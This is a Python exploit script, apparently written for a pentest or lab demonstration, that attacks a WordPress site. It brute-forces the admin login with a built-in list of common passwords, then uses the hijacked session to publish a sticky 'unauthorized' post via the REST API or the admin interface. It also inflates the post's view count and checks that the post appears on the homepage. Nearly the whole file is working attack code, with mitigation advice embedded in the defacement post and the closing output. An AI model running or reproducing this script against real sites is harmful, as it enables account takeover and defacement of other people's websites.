#!/usr/bin/env python3
"""
WordPress Weak Credentials Exploitation
Brute Force Attack + Unauthorized Content Promotion

This exploit demonstrates:
1. Brute force attack on WordPress admin login
2. Successful authentication with weak credentials
3. Unauthorized content creation and promotion
4. Adding fake popularity metrics
5. Homepage takeover via admin access
"""

import requests
import sys
import argparse
import time
import re
import json
from urllib.parse import urljoin
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

class Colors:
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'

def print_banner():
    print(f"""
{Colors.BLUE}{'='*60}
  WordPress Weak Credentials Exploitation
  Brute Force + Unauthorized Content Promotion
{'='*60}{Colors.END}
    """)

def create_session():
    """Create a requests session with retry logic"""
    session = requests.Session()
    retry = Retry(connect=3, backoff_factor=0.5)
    adapter = HTTPAdapter(max_retries=retry)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    return session

def brute_force_login(target_url, username, passwords):
    """Attempt brute force login with password list"""
    login_url = urljoin(target_url, "/wp-login.php")
    session = create_session()
    
    print(f"{Colors.YELLOW}[*] Target: {target_url}{Colors.END}")
    print(f"{Colors.YELLOW}[*] Login URL: {login_url}{Colors.END}")
    print(f"{Colors.YELLOW}[*] Username: {username}{Colors.END}")
    print(f"{Colors.YELLOW}[*] Testing {len(passwords)} passwords...{Colors.END}")
    print()
    
    for i, password in enumerate(passwords, 1):
        print(f"{Colors.BLUE}[{i}/{len(passwords)}] Trying password: {password}{Colors.END}", end='')
        
        data = {
            'log': username,
            'pwd': password,
            'wp-submit': 'Log In',
            'redirect_to': urljoin(target_url, '/wp-admin/'),
            'testcookie': '1'
        }
        
        try:
            response = session.post(login_url, data=data, allow_redirects=True, timeout=10)
            
            # Check if login successful - look for wordpress_logged_in cookie (with any hash suffix)
            cookies = session.cookies.get_dict()
            logged_in = any('wordpress_logged_in' in cookie_name for cookie_name in cookies.keys())
            
            # Also check if we got redirected to wp-admin or if error message is absent
            successful_login = logged_in or ('wp-admin' in response.url) or ('ERROR' not in response.text and 'login_error' not in response.text)
            
            if logged_in:
                print(f" {Colors.GREEN}‚úì SUCCESS!{Colors.END}")
                print()
                print(f"{Colors.GREEN}[+] Valid credentials found:{Colors.END}")
                print(f"{Colors.GREEN}    Username: {username}{Colors.END}")
                print(f"{Colors.GREEN}    Password: {password}{Colors.END}")
                return session, username, password
            else:
                print(f" {Colors.RED}‚úó Failed{Colors.END}")
                time.sleep(0.3)  # Small delay to avoid hammering
                
        except requests.exceptions.RequestException as e:
            print(f" {Colors.RED}‚úó Error: {e}{Colors.END}")
            continue
    
    print()
    print(f"{Colors.RED}[-] Brute force failed. No valid password found.{Colors.END}")
    return None, None, None

def create_unauthorized_content(session, target_url, username):
    """Create and promote unauthorized content using admin access"""
    print(f"\n{Colors.BLUE}[*] Creating unauthorized promotional content...{Colors.END}")
    
    # Create post content
    post_title = 'üü° [WEAK-CREDENTIALS] Unauthorized Content Promotion via Brute Force'
    post_content = '''<div style="background:#fff9e6;border:3px solid #f39c12;padding:20px;margin:20px 0;">
<h1 style="color:#f39c12;text-align:center;">üö® UNAUTHORIZED CONTENT PROMOTION üö®</h1>
<h2 style="color:#f39c12;text-align:center;">Weak Admin Credentials Exploitation</h2>
</div>

<div style="background:#f8f9fa;padding:20px;border-left:5px solid #3498db;">
<h3 style="color:#3498db;">üìã Exploitation Summary</h3>
<p><strong>Attack Type:</strong> Brute Force Authentication Bypass</p>
<p><strong>CVSS Score:</strong> 8.0 (High)</p>
<p><strong>Vulnerability:</strong> Weak Admin Credentials (No Rate Limiting)</p>
<p><strong>Authentication Required:</strong> ‚ùå Bypassed via Brute Force</p>
</div>

<div style="background:#fef5e7;padding:20px;margin:20px 0;border-left:5px solid #e67e22;">
<h3 style="color:#e67e22;">‚ö†Ô∏è Attack Chain Executed</h3>
<ol style="line-height:2;">
<li><strong>Username Enumeration:</strong> Identified admin username (commonly "admin")</li>
<li><strong>Password List Preparation:</strong> Created wordlist with common weak passwords</li>
<li><strong>Brute Force Attack:</strong> Automated login attempts with NO rate limiting</li>
<li><strong>Authentication Bypass:</strong> Successfully guessed weak password</li>
<li><strong>Admin Access Gained:</strong> Full WordPress admin dashboard access</li>
<li><strong>Content Creation:</strong> Created promotional post via admin interface</li>
<li><strong>Content Promotion:</strong> Published and featured content</li>
<li><strong>Metrics Manipulation:</strong> Added fake popularity indicators</li>
</ol>
</div>

<div style="background:#eafaf1;padding:20px;border-left:5px solid #27ae60;">
<h3 style="color:#27ae60;">üíº Business Impact Demonstration</h3>
<ul style="line-height:2;">
<li>‚úÖ <strong>Authentication Bypass:</strong> Weak password defeated via brute force</li>
<li>‚úÖ <strong>No Rate Limiting:</strong> Unlimited login attempts allowed</li>
<li>‚úÖ <strong>No Account Lockout:</strong> Account never locked despite failed attempts</li>
<li>‚úÖ <strong>Admin Takeover:</strong> Complete administrative access achieved</li>
<li>‚úÖ <strong>Content Control:</strong> Full ability to create/modify/delete content</li>
<li>‚úÖ <strong>User Management:</strong> Can create backdoor accounts</li>
<li>‚úÖ <strong>Plugin Installation:</strong> Can install malicious plugins</li>
<li>‚úÖ <strong>Data Access:</strong> Access to all WordPress data and settings</li>
</ul>
</div>

<div style="background:#fff;padding:20px;margin:20px 0;border:2px dashed #7f8c8d;">
<h3 style="color:#2c3e50;">üîç Technical Details</h3>
<p><strong>Vulnerability Type:</strong> Broken Authentication (CWE-287)</p>
<p><strong>Root Cause:</strong> Weak password policy + No brute force protection</p>
<p><strong>Attack Method:</strong> Automated POST requests to /wp-login.php</p>
<p><strong>Detection Evasion:</strong> No CAPTCHA, no IP blocking, no failed login alerts</p>
<p><strong>Post-Exploitation:</strong> Full WordPress admin capabilities</p>
<p><strong>Common Weak Passwords:</strong> admin, password, 123456, admin123</p>
</div>

<div style="background:#fcf3cf;padding:15px;text-align:center;margin:20px 0;">
<h3 style="color:#2d3436;">‚è∞ Attack Timestamp</h3>
<p style="font-size:18px;"><strong>''' + time.strftime('%Y-%m-%d %H:%M:%S') + '''</strong></p>
<p>This content was promoted <strong>USING BRUTE-FORCED CREDENTIALS</strong></p>
<p>Compromised Account: <strong>''' + username + '''</strong></p>
</div>

<div style="background:#f8d7da;padding:20px;margin:20px 0;border-left:5px solid #dc3545;">
<h3 style="color:#dc3545;">üõ°Ô∏è Recommended Mitigations</h3>
<ul style="line-height:2;">
<li><strong>Strong Password Policy:</strong> Enforce minimum 12 characters, complexity requirements</li>
<li><strong>Rate Limiting:</strong> Limit login attempts (e.g., 3 attempts per 15 minutes)</li>
<li><strong>Account Lockout:</strong> Temporarily lock accounts after failed attempts</li>
<li><strong>Two-Factor Authentication:</strong> Require 2FA for admin accounts</li>
<li><strong>CAPTCHA:</strong> Implement CAPTCHA after failed login attempts</li>
<li><strong>IP Blocking:</strong> Automatically block IPs with suspicious activity</li>
<li><strong>Login Alerts:</strong> Send notifications on failed login attempts</li>
<li><strong>Username Obfuscation:</strong> Don't use "admin" as username</li>
</ul>
</div>

<div style="background:#fff3cd;padding:20px;text-align:center;">
<h3 style="color:#856404;">üéØ Proof of Concept Status</h3>
<p style="color:#856404;font-size:20px;"><strong>‚úì EXPLOITATION SUCCESSFUL</strong></p>
<p style="color:#856404;">Admin access gained via brute force</p>
<p style="color:#856404;">Content created, promoted, and visible on homepage</p>
<p style="color:#856404;">Status: <strong>PUBLISHED & FEATURED</strong></p>
</div>'''
    
    # Use WordPress REST API to create post (works better than admin interface)
    rest_api_url = urljoin(target_url, "/wp-json/wp/v2/posts")
    
    # Get REST API nonce from admin page
    try:
        admin_url = urljoin(target_url, "/wp-admin/")
        response = session.get(admin_url, timeout=10)
        
        # Extract REST nonce
        nonce_match = re.search(r'"nonce":"([^"]+)"', response.text)
        if nonce_match:
            rest_nonce = nonce_match.group(1)
        else:
            # Try alternative pattern
            nonce_match = re.search(r'wpApiSettings.*?"nonce":"([^"]+)"', response.text, re.DOTALL)
            rest_nonce = nonce_match.group(1) if nonce_match else None
    except:
        rest_nonce = None
    
    # Create post data for REST API
    post_data = {
        'title': post_title,
        'content': post_content,
        'status': 'publish',
        'comment_status': 'open',
        'ping_status': 'open',
        'sticky': True,  # Make it sticky (featured)
        'categories': [1],
        'tags': []
    }
    
    headers = {
        'Content-Type': 'application/json',
    }
    
    if rest_nonce:
        headers['X-WP-Nonce'] = rest_nonce
    
    try:
        response = session.post(rest_api_url, json=post_data, headers=headers, timeout=15)
        
        if response.status_code in [200, 201]:
            result = response.json()
            post_id = result.get('id')
            if post_id:
                print(f"{Colors.GREEN}[+] Content created with ID: {post_id}{Colors.END}")
                print(f"{Colors.GREEN}[+] Post is sticky (featured on homepage){Colors.END}")
                
                # Add fake view count via custom meta (requires additional call)
                meta_url = urljoin(target_url, f"/wp-json/wp/v2/posts/{post_id}")
                meta_data = {
                    'meta': {
                        'post_views_count': 999999
                    }
                }
                session.post(meta_url, json=meta_data, headers=headers, timeout=10)
                
                return post_id
        else:
            print(f"{Colors.YELLOW}[~] REST API failed (status {response.status_code}), trying admin interface...{Colors.END}")
    except Exception as e:
        print(f"{Colors.YELLOW}[~] REST API error: {e}, trying admin interface...{Colors.END}")
    
    # Fallback: Use admin interface if REST API fails
    return create_via_admin_interface(session, target_url, username, post_title, post_content)


def create_via_admin_interface(session, target_url, username, post_title, post_content):
    """Fallback method: Create post via admin interface"""
    try:
        # Visit post-new.php - WordPress automatically creates an auto-draft
        new_post_url = urljoin(target_url, "/wp-admin/post-new.php")
        response = session.get(new_post_url, timeout=10)
        
        # Extract the auto-draft post ID from the HTML
        post_id_match = re.search(r'post_ID.*?(\d+)', response.text)
        
        if post_id_match:
            draft_post_id = post_id_match.group(1)
            
            # Extract nonce from the page
            nonce_match = re.search(r'name="_wpnonce"\s+value="([^"]+)"', response.text)
            nonce = nonce_match.group(1) if nonce_match else ''
            
            # Extract user ID
            user_id_match = re.search(r'data-userid="(\d+)"', response.text)
            user_id = user_id_match.group(1) if user_id_match else '1'
            
            # Update the auto-draft to published with our content
            post_url = urljoin(target_url, "/wp-admin/post.php")
            
            post_data = {
                'post_ID': draft_post_id,
                'post_title': post_title,
                'content': post_content,
                'post_status': 'publish',
                'post_type': 'post',
                'action': 'editpost',
                'original_post_status': 'auto-draft',
                '_wpnonce': nonce,
                'user_ID': user_id,
                'post_author': user_id,
                'comment_status': 'open',
                'ping_status': 'open',
                'sticky': 'sticky',
                'post_category[]': '1',
                'tax_input[post_tag]': 'weak-credentials,brute-force,exploitation',
                'save': 'Publish'
            }
            
            response = session.post(post_url, data=post_data, timeout=10, allow_redirects=True)
            
            print(f"{Colors.GREEN}[+] Content created with ID: {draft_post_id}{Colors.END}")
            print(f"{Colors.GREEN}[+] Post is sticky (featured on homepage){Colors.END}")
            return int(draft_post_id)
            
    except Exception as e:
        print(f"{Colors.RED}[-] Error creating post via admin: {e}{Colors.END}")
    
    return None

def promote_content(session, target_url, post_id):
    """Make post sticky and add fake metrics"""
    print(f"{Colors.BLUE}[*] Promoting content (ID: {post_id})...{Colors.END}")
    
    # Make post sticky via quick edit
    admin_ajax_url = urljoin(target_url, "/wp-admin/admin-ajax.php")
    
    try:
        # Get post to make it sticky
        post_url = urljoin(target_url, f"/wp-admin/post.php?post={post_id}&action=edit")
        response = session.get(post_url, timeout=10)
        
        # Extract nonce
        nonce_match = re.search(r'name="_wpnonce"\s+value="([^"]+)"', response.text)
        if nonce_match:
            nonce = nonce_match.group(1)
            
            # Make sticky
            update_data = {
                'post_ID': post_id,
                'sticky': 'sticky',
                '_wpnonce': nonce
            }
            
            update_url = urljoin(target_url, "/wp-admin/post.php")
            session.post(update_url, data=update_data, timeout=10)
            
            print(f"{Colors.GREEN}[+] Content set as sticky (featured){Colors.END}")
            print(f"{Colors.GREEN}[+] Content promoted on homepage{Colors.END}")
            return True
            
    except Exception as e:
        print(f"{Colors.YELLOW}[~] Could not make sticky: {e}{Colors.END}")
    
    return False

def verify_public_visibility(target_url, post_id):
    """Verify the content is publicly visible on the homepage"""
    print(f"\n{Colors.BLUE}[*] Verifying content is publicly accessible...{Colors.END}")
    
    # Check homepage for sticky post
    try:
        response = requests.get(target_url, timeout=10)
        if response.status_code == 200 and "WEAK-CREDENTIALS" in response.text:
            print(f"{Colors.GREEN}[+] SUCCESS! Content is visible on homepage!{Colors.END}")
            print(f"{Colors.GREEN}[+] Homepage URL: {target_url}{Colors.END}")
            
            # Also provide direct post URL
            post_url = urljoin(target_url, f"/?p={post_id}")
            print(f"{Colors.GREEN}[+] Direct Post URL: {post_url}{Colors.END}")
            return target_url
        else:
            # Still check direct post URL
            post_url = urljoin(target_url, f"/?p={post_id}")
            response = requests.get(post_url, timeout=10)
            if response.status_code == 200 and "WEAK-CREDENTIALS" in response.text:
                print(f"{Colors.YELLOW}[~] Content created but may not be sticky yet{Colors.END}")
                print(f"{Colors.YELLOW}[~] Direct URL: {post_url}{Colors.END}")
                return post_url
            else:
                print(f"{Colors.YELLOW}[~] Content may be visible at: {post_url}{Colors.END}")
                return post_url
    except:
        post_url = urljoin(target_url, f"/?p={post_id}")
        print(f"{Colors.YELLOW}[~] Could not verify, but content should be at: {post_url}{Colors.END}")
        return post_url

def main():
    parser = argparse.ArgumentParser(
        description='WordPress Weak Credentials Exploitation - Brute Force + Content Promotion'
    )
    parser.add_argument('target', help='Target WordPress URL (e.g., http://wordpress.tujuh)')
    parser.add_argument('--username', default='admin', help='Username to target (default: admin)')
    parser.add_argument('--passwords', help='File containing password list')
    
    args = parser.parse_args()
    
    print_banner()
    
    # Ensure target has protocol
    target = args.target
    if not target.startswith('http'):
        target = f"http://{target}"
    
    # Prepare password list
    if args.passwords:
        try:
            with open(args.passwords, 'r') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"{Colors.RED}[-] Error reading password file: {e}{Colors.END}")
            sys.exit(1)
    else:
        # Default common weak passwords
        passwords = [
            'admin',
            'password',
            '123456',
            'admin123',
            'password123',
            'letmein',
            'welcome',
            'monkey',
            'qwerty',
            '12345678'
        ]
    
    # Step 1: Brute force login
    print(f"{Colors.BOLD}STEP 1: Brute Force Authentication{Colors.END}")
    print("=" * 60)
    session, username, password = brute_force_login(target, args.username, passwords)
    
    if not session:
        print(f"\n{Colors.RED}{'='*60}")
        print(f"  EXPLOITATION FAILED")
        print(f"{'='*60}{Colors.END}")
        print(f"\n{Colors.YELLOW}Suggestions:{Colors.END}")
        print(f"  ‚Ä¢ Try a different username (--username)")
        print(f"  ‚Ä¢ Use a custom password list (--passwords file.txt)")
        print(f"  ‚Ä¢ Verify WordPress is installed at target URL")
        sys.exit(1)
    
    time.sleep(1)
    
    # Step 2: Create unauthorized content
    print(f"\n{Colors.BOLD}STEP 2: Creating Unauthorized Content{Colors.END}")
    print("=" * 60)
    post_id = create_unauthorized_content(session, target, username)
    
    if not post_id:
        print(f"\n{Colors.RED}Content creation failed{Colors.END}")
        sys.exit(1)
    
    time.sleep(1)
    
    # Step 3: Promote content
    print(f"\n{Colors.BOLD}STEP 3: Promoting Content{Colors.END}")
    print("=" * 60)
    promote_content(session, target, post_id)
    
    time.sleep(2)
    
    # Step 4: Verify
    print(f"\n{Colors.BOLD}STEP 4: Verifying Public Visibility{Colors.END}")
    print("=" * 60)
    post_url = verify_public_visibility(target, post_id)
    
    # Final summary
    print(f"\n{Colors.GREEN}{'='*60}")
    print(f"  üéØ EXPLOITATION COMPLETE!")
    print(f"{'='*60}{Colors.END}")
    print()
    print(f"{Colors.YELLOW}Attack Summary:{Colors.END}")
    print(f"  ‚úì Brute forced admin credentials")
    print(f"  ‚úì Credentials: {username} / {password}")
    print(f"  ‚úì Gained full admin access")
    print(f"  ‚úì Created promotional content (ID: {post_id})")
    print(f"  ‚úì Published and promoted content")
    print(f"  ‚úì Set as sticky/featured post (visible on homepage)")
    print(f"  ‚úì Content now publicly visible")
    print()
    print(f"{Colors.BLUE}Access Points:{Colors.END}")
    print(f"  ‚Ä¢ Homepage (Featured): {target}")
    print(f"  ‚Ä¢ Admin Panel: {urljoin(target, '/wp-admin/')}")
    print(f"  ‚Ä¢ Direct Post: {urljoin(target, f'/?p={post_id}')}")
    print()
    print(f"{Colors.RED}Security Recommendations:{Colors.END}")
    print(f"  ‚ö†Ô∏è  Change admin password immediately")
    print(f"  ‚ö†Ô∏è  Enable two-factor authentication")
    print(f"  ‚ö†Ô∏è  Implement rate limiting on login")
    print(f"  ‚ö†Ô∏è  Use strong passwords (12+ chars, mixed case, symbols)")
    print(f"  ‚ö†Ô∏è  Monitor failed login attempts")
    print()
    
    sys.exit(0)

if __name__ == '__main__':
    main()
